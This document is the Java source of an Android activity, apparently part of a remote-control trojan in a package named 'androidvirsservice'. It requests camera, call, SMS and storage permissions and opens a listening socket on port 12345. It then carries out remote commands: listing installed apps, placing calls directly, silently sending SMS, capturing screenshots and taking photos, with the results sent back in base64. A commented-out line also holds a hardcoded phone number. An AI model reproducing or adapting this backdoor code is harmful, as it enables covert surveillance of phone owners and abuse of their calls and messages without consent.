package com.example.androidvirsservice;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore;
import android.telephony.SmsManager;
import android.view.View;
import android.widget.ImageView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.FileProvider;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class NotificationActivity extends AppCompatActivity {
    String applist = new String();
    byte[] bytebuffer;
    private boolean isOut = false;
    private boolean isOver = false;
    private boolean isReady;
    BufferedInputStream inputStream;
    BufferedOutputStream outputStream;
    Bitmap bitmap;
    private static final int TAKE_PHOTO = 100;
    private static final int TAKE_PHOTO_Big = 101;
    private ImageView iv;
    File photoFile = null;

    private FileInputStream is = null;
    private  Bitmap GetScreenShot1(){
        int width = getWindow().getDecorView().getRootView().getWidth();
        int height = getWindow().getDecorView().getRootView().getHeight();
        //生成相同大小的图片
        Bitmap temBitmap = Bitmap.createBitmap( width, height, Bitmap.Config.ARGB_8888 );
        //找到当前页面的跟布局
        View view = getWindow().getDecorView().getRootView();
        //设置缓存
        view.setDrawingCacheEnabled(true);
        view.buildDrawingCache();
        //从缓存中获取当前屏幕的图片
        temBitmap = view.getDrawingCache();
        return temBitmap;
    }
    private File createImageFile() throws IOException {
        // Create an image file name
        String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
        String imageFileName = "JPEG_" + timeStamp + "_";
        File storageDir = getExternalFilesDir(Environment.DIRECTORY_PICTURES);
        File image = File.createTempFile(
                imageFileName,  /* prefix */
                ".jpg",         /* suffix */
                storageDir      /* directory */
        );

        return image;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        //判断请求码和返回码
        if (requestCode == TAKE_PHOTO) {
            if (resultCode == RESULT_OK) {
                bitmap = data.getParcelableExtra("data");
                //           Bitmap bitmap =BitmapFactory.decodeResource(getResources(),R.drawable.bitmap );
//           ////////https://www.jb51.net/article/102371.htm
                bytebuffer = Base64Util.bitmapToBase64(bitmap).getBytes();
//            StringBuffer str=new StringBuffer();
//            str.append(new String(bytebuffer,0,bytebuffer.length));
//         Bitmap bitmap1=Base64Util.base64ToBitmap(str.toString());
////
//          iv.setImageBitmap(bitmap1);
            } else if (resultCode == RESULT_CANCELED) {
                bytebuffer = "被控取消了拍照".getBytes();
            }

        }else if(requestCode == TAKE_PHOTO_Big){
            if (resultCode == RESULT_OK) {
                try {
                    // 获取输入流
                    is = new FileInputStream(photoFile.getPath());
                    // 把流解析成bitmap
                    Bitmap bitmap = BitmapFactory.decodeStream(is);
                    // 设置图片
                    bytebuffer = Base64Util.bitmapToBase64(bitmap).getBytes();
                } catch (FileNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                } finally {
                    // 关闭流
                    try {
                        is.close();
                    } catch (IOException e) {
                        // TODO Auto-generated catch block
                        e.printStackTrace();
                    }
                }
            }
        }
        isReady = true;
    }

    @SuppressLint("HandlerLeak")
    Handler handler = new Handler() {
        @Override
        public void handleMessage(Message msg) {

            super.handleMessage(msg);
            switch (msg.what) {
                case CommonStatues.APPlist:
                    PackageManager pm = getPackageManager();
                    // Return a List of all packages that are installed on the device.
                    List<PackageInfo> packages = pm.getInstalledPackages(0);
                    for (PackageInfo packageInfo : packages) {
                        // 判断系统/非系统应用
                        if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) // 非系统应用
                        {
                            applist += "用户应用 ： " + packageInfo.packageName + "\n";
                            //System.out.println("MainActivity.getAppList, packageInfo=" + packageInfo.packageName);
                        } else {
                            // 系统应用
                            //System.out.println("System .getAppList, packageInfo=" + packageInfo.packageName);
                            applist += "系统应用 ： " + packageInfo.packageName + "\n";
                        }
                    }
                    if (applist.equals("") || applist.isEmpty() || applist.equals(" ")) {
                        applist = "获取列表失败";
                    }
                    bytebuffer = applist.getBytes();
                    isReady = true;

//                    处理事件
                    break;
                case CommonStatues.SendToast:
                    // Toast.makeText(this, (CharSequence) msg.obj, Toast.LENGTH_SHORT).show();
                    break;
                case CommonStatues.Call:

                    Intent intent = new Intent(Intent.ACTION_CALL);//ACTION_CALL需要动态申请权限,直接拨打 不需要用户确认

                    intent.setData(Uri.parse("tel:" + msg.obj.toString()));
                    startActivity(intent);
                    bytebuffer = "已经拨号".getBytes();
                    isReady = true;
                    break;
                case CommonStatues.CallDialog:
                    Intent intent2 = new Intent(Intent.ACTION_DIAL);//ACTION_CALL需要动态申请权限,直接拨打 不需要用户确认

                    intent2.setData(Uri.parse("tel:" + msg.obj.toString()));
                    startActivity(intent2);
                    bytebuffer = "已经拨号".getBytes();
                    isReady = true;
                    break;
                case CommonStatues.SmsDialog:
                    String source = msg.obj.toString();
                    String sender = source.substring(0, source.indexOf(CommonStatues.separate));
                    String text = source.substring(sender.length() + CommonStatues.separate.length(), source.length());
                    intent = new Intent(Intent.ACTION_VIEW, Uri.parse("smsto:" + sender));
                    intent.putExtra("sms_body", text);
                    startActivity(intent);
                    bytebuffer = "短信已经创建".getBytes();
                    isReady = true;
                    break;
                case CommonStatues.SendSms:
                    String source2 = msg.obj.toString();
                    String sender2 = source2.substring(0, source2.indexOf(CommonStatues.separate));
                    String text2 = source2.substring(sender2.length() + CommonStatues.separate.length(), source2.length());
//                    System.out.println(sender2);
//                    System.out.println(text2);

                    SmsManager manager = SmsManager.getDefault();
                    ArrayList<String> strings = manager.divideMessage(text2);
                    for (int i = 0; i < strings.size(); i++) {
                        manager.sendTextMessage(sender2, null, text2, null, null);
                    }
//                    manager.sendTextMessage("15238981687", null, "123", null, null);
                    bytebuffer = "短信已经发送".getBytes();
                    isReady = true;
                    break;
                case CommonStatues.ScreenShot:
                    int shot=Integer.parseInt((String)msg.obj);
                    Bitmap temBitmap=null;
                    switch(shot){
                        case 1:
                            temBitmap=GetScreenShot1();
                            break;

                    }
                    bytebuffer = Base64Util.bitmapToBase64(temBitmap).getBytes();
                    isReady = true;
                    break;
                case CommonStatues.TakePhotoSmall:
                    //bytebuffer="清空缓冲区".getBytes();
                    Intent takePhotoIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                    //判断系统中是否有照相机
                    if (takePhotoIntent.resolveActivity(getPackageManager()) != null) {
                        startActivityForResult(takePhotoIntent, TAKE_PHOTO);
                    }
                    break;
                case CommonStatues.TakePhotoBig:
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                        // Ensure that there's a camera activity to handle the intent
                        if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
                            // Create the File where the photo should go

                            try {
                                photoFile = createImageFile();

                            } catch (IOException ex) {
                                // Error occurred while creating the File

                            }
                            // Continue only if the File was successfully created
                            if (photoFile != null) {
                                Uri photoURI = FileProvider.getUriForFile(NotificationActivity.this, ProviderUtil.getFileProviderName(NotificationActivity.this),photoFile );

                                takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, photoURI);
                                startActivityForResult(takePictureIntent, TAKE_PHOTO_Big);
                            }
                        }



                    }else{
                        // 指定拍照
                        Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                        // 加载路径
                        Uri uri = Uri.fromFile(new File(photoFile.getPath()));
                        // 指定存储路径，这样就可以保存原图了
                        takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT, uri);
                        // 拍照返回图片
                        startActivityForResult(takePictureIntent, TAKE_PHOTO_Big);

                    }
                    break;
                case CommonStatues.GetLastBuffer:
                    isReady=true;
                    break;
            }

            System.out.println("------消息循环结束 over------");


        }
    };


    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    public void MyRequestPermission() {
        String[] permissions = new String[]{
                Manifest.permission.CAMERA,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.SEND_SMS
        };//你需要申请权限的列表

        List<String> mPermissionList = new ArrayList<>();
        for (int i = 0; i < permissions.length; i++) {
            if (ActivityCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);
            }
        }
        if (!mPermissionList.isEmpty())
            ActivityCompat.requestPermissions(this, mPermissionList.toArray(new String[mPermissionList.size()]), 66);
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_picture);
//        MyRequestPermission();
//
        MyRequestPermission();
        iv = findViewById(R.id.img);

        new Thread(new Runnable() {

            @Override
            public void run() {
                try {
                    final ServerSocket serverSocket = new ServerSocket(12345);
                    System.out.println("等待客户端连接");
                    while (!isOut) { // 服务端不退出，这个线程一直执行
                        final Socket client = serverSocket.accept(); // 阻塞在此，直到客户端连接
                        System.out.println("客户端已连接，ip地址: " + client.getInetAddress().getHostAddress() + "  端口号:" + client.getPort());//这里获取的是局域网ip和 发送端的临时端口

                        // 客户端连接后，等待1s以便客户端发消息
                        //Thread.sleep(1000);
                        try {
                            inputStream = new BufferedInputStream(client.getInputStream());
                            outputStream = new BufferedOutputStream(client.getOutputStream());

                            System.out.println("开始和客户端通信");
                            //while (!isOver) { // 消息不为over，线程一直执行
                            //////////////////////
                            for (int i = 0; i < 20; i++) {
                                if (inputStream.available() > 0) {
                                    break;
                                }
                                Thread.sleep(10);
                            }
                            /////////////////////
                            if (inputStream.available() <= 0) {
                                System.out.println("-----获取消息超时-----");
                                inputStream.close();
                                outputStream.close();
                                client.close();
                                continue; // 过滤空消息
                            }
                            Message msg = handler.obtainMessage();
                            msg.what = inputStream.read();
                            outputStream.write(msg.what);
                            System.out.println("迅速回应消息");
                            outputStream.flush();//迅速回应消息

                            byte[] bytes = new byte[4096];
                            int len;
                            StringBuffer stringBuffer = new StringBuffer();

                            while (inputStream.available() > 0 && (len = inputStream.read(bytes)) != -1) {
                                stringBuffer.append(new String(bytes, 0, len));
                            } // 下面就不对stringBuffer的内容判空了，因为是空的话，根本跳不出上面的过滤

                            msg.obj = stringBuffer;
                            System.out.println("派送客户端信息:0x00" + msg.what + " " + stringBuffer.toString());
                            isReady = false;
                            handler.sendMessage(msg);
                            // isOver =fromClient.equals("over");
                            // isOut = isOver;
                            //}
                            for (int i = 0; i < 50; i++) {
                                if (isReady) {
                                    break;
                                }
                                Thread.sleep(10);
                            }

                            System.out.println("截图" + bytebuffer.toString());

                            outputStream.write(bytebuffer);
                            outputStream.flush();

                            inputStream.close();
                            outputStream.close();
                            client.close();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }


                } catch (Exception e) {
                    e.printStackTrace();
                }

            }

        }

        ).start();
    }
}
